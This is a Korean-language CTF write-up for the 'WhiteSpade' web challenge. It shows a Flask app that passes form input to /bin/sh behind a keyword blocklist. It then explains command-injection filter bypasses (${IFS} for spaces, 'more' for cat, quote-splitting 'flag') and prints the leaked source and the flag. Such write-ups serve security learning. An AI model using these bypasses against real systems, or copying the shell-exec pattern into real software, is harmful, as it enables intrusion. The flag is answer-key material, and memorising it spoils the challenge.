# WhiteSpade
web.isangxcaution.xyz:28000

Made by yenua

```python
import subprocess

from flask import Flask, request, render_template

app = Flask(__name__)

with open('./flag.txt', 'r') as f:
    FLAG = f.read()

keywords = keywords = [*** REDUCTED ***]
def check_input(data):
    for keyword in keywords:
        if keyword in data.lower():
            return True
    return False

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/commandroom', methods=['GET', 'POST'])
def command():
    if request.method == 'POST':
        cmd = request.form.get('cmd')
        print(cmd)
        if check_input(cmd):
            return render_template('command.html', result='do not hack ㅡㅡ')
        try:
            result = subprocess.check_output(['/bin/sh', '-c', cmd], timeout=5)
            resp = render_template('command.html', result=result.decode('utf-8'))
        except Exception as e:
            print(e)
            resp = render_template('command.html', result='error...')
        return resp
    return render_template('command.html')

app.run(host='0.0.0.0', port=8080)
```

소스 코드를 보면 keywords로 filtering 하고 있음을 알 수 있다. <br>
먼저 몇 가지 시도해보니, 해당 키워드에 'cat', 'flag' 및 whitespace 가 들어가 있음을 알 수 있었다. <br>
파이썬에서 whitespace 필터링을 우회하고, shell에서는 작동하게 하기 위해 기본 whitespace 환경 변수 '${IFS}' 를 사용하였고,
cat를 대신해서 more 명령어를 사용했다. 
```sh
more${IFS}app.py
``` 
실행 시 다음 결과 값을 받을 수 있다.
```python
:::::::::::::: app.py :::::::::::::: import subprocess from flask import Flask, request, render_template app = Flask(__name__) with open('./flag.txt', 'r') as f: FLAG = f.read() keywords = keywords = [' ', '*', '/', '=', '\n', '\r', '\t', '\x0b', '\x0c', '-', '+', 'flag', 'cat'] def check_input(data): for keyword in keywords: if keyword in data.lower(): return True return False @app.route('/') def index(): return render_template('index.html') @app.route('/commandroom', methods=['GET', 'POST']) def command(): if request.method == 'POST': cmd = request.form.get('cmd') print(cmd) #for log if check_input(cmd): return render_template('command.html', result='do not hack ㅡㅡ') try: result = subprocess.check_output(['/bin/sh', '-c', cmd], timeout=5) resp = render_template('command.html', result=result.decode('utf-8')) except Exception as e: print(e) #for log resp = render_template('command.html', result='error...') return resp return render_template('command.html') app.run(host='0.0.0.0', port=8080)
```
해당 결과로 keywords 값을 알아낼 수 있었고, flag 키워드 우회를 위해 
```sh
more${IFS}fl"a"g.txt
```
실행으로 FLAG 값을 받을 수 있었다.
```
:::::::::::::: flag.txt :::::::::::::: IxC{wh1t35pac3_can_b3_r3plac3d_w1th_IFS}
```
